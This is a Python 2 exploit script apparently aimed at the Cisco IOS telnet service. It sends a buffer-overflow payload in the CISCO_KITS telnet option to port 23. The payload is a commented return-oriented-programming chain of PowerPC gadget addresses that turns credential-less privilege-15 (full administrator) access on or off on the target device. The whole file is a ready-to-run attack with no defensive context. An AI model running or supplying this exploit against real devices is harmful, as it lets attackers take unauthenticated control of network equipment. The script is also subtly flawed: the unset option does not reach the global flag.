import socket
from time import sleep
import os
set_credless = True
def exp(args,target_ip):
	if args=="--set":
		set_credless=True
	elif args=="--unset":
		set_credless=False
	else:
		print "[-]args error!"
		return
	s = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target_ip, 23))

	print '[+] Connection OK'
	print '[+] Recieved bytes from telnet service:', repr(s.recv(1024))
	#sleep(0.5)
	print '[+] Sending cluster option'

	print '[+] Setting credless privilege 15 authentication' if set_credless else '[+] Unsetting credless privilege 15 authentication'



	payload = '\xff\xfa\x24\x00'
	payload += '\x03CISCO_KITS\x012:'
	payload += 'A' * 116
	payload += '\x00\x00\x37\xb4'		# first gadget address 0x000037b4: lwz r0, 0x14(r1); mtlr r0; lwz r30, 8(r1); lwz r31, 0xc(r1); addi r1, r1, 0x10; blr;
	#next bytes are shown as offsets from r1
	payload += '\x02\x3d\x55\xdc'		# +8  address of pointer to is_cluster_mode function - 0x34
	if set_credless is True:
		payload += '\x00\x00\x99\x9c'	# +12 set  address of func that rets 1
	else:
		payload +=	'\x00\x04\xeA\xe0'	# unset 
	payload += 'BBBB'					# +16(+0) r1 points here at second gadget
	payload += '\x00\xe1\xa9\xf4' 		# +4 second gadget address 0x00e1a9f4: stw r31, 0x138(r30); lwz r0, 0x1c(r1); mtlr r0; lmw r29, 0xc(r1); addi r1, r1, 0x18; blr;
	payload += 'CCCC'					# +8 
	payload += 'DDDD'					# +12
	payload += 'EEEE'					# +16(+0) r1 points here at third gadget
	payload += '\x00\x06\x7b\x5c'		# +20(+4) third gadget address. 0x00067b5c: lwz r9, 8(r1); lwz r3, 0x2c(r9); lwz r0, 0x14(r1); mtlr r0; addi r1, r1, 0x10; blr; 
	payload += '\x02\x3d\x55\xc8'		# +8  r1+8 = 0x23d55c8
	payload += 'FFFF'					# +12 
	payload += 'GGGG'					# +16(+0) r1 points here at fourth gadget 
	payload += '\x00\x6c\xb3\xa0' 		# +20(+4) fourth gadget address 0x006cb3a0: lwz r31, 8(r1); lwz r30, 0xc(r1); addi r1, r1, 0x10; lwz r0, 4(r1); mtlr r0; blr;
	if set_credless:
		payload += '\x00\x27\x0b\x94'	# +8 address of the replacing function that returns 15 (our desired privilege level). 0x00270b94: li r3, 0xf; blr; 
	else:
		payload += '\x00\x04\xe7\x78'	# unset
	payload += 'HHHH'					# +12
	payload += 'IIII'					# +16(+0) r1 points here at fifth gadget
	payload += '\x01\x4a\xcf\x98'		# +20(+4) fifth gadget address 0x0148e560: stw r31, 0(r3); lwz r0, 0x14(r1); mtlr r0; lwz r31, 0xc(r1); addi r1, r1, 0x10; blr;
	payload += 'JJJJ'					# +8 r1 points here at third gadget
	payload += 'KKKK'					# +12
	payload += 'LLLL'					# +16
	payload += '\x01\x14\xe7\xec'		# +20 original execution flow return addr
	payload += ':15:' +  '\xff\xf0'

	s.send(payload)

	print '[+] All done'

	s.close()

